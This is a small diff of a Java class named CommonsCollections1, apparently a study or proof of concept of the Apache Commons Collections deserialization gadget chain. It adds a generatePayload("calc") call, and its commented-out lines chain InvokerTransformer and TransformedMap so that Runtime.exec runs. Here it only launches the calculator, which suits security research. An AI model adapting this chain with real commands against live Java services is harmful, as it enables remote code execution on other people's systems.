@@ -44,10 +44,10 @@ public class CommonsCollections1  {
 
 
     public static void main(String[] args) throws IOException, NoSuchMethodException, InvocationTargetException, IllegalAccessException, ClassNotFoundException, InstantiationException {
-
+        String s = generatePayload("calc");
 //          Runtime r = Runtime.getRuntime();
 //          //new InvokerTransformer("exec", new Class[]{String.class},new Object[]{"calc"}).transform(r);
-//        InvokerTransformer invokertransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
+//        InvokerTransformer invokertrans1former = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"calc"});
 //        HashMap<Object,Object> map = new HashMap();
 //        map.put("key","value");
 //        Map<Object,Object> transformedmap = TransformedMap.decorate(map, null, invokertransformer);
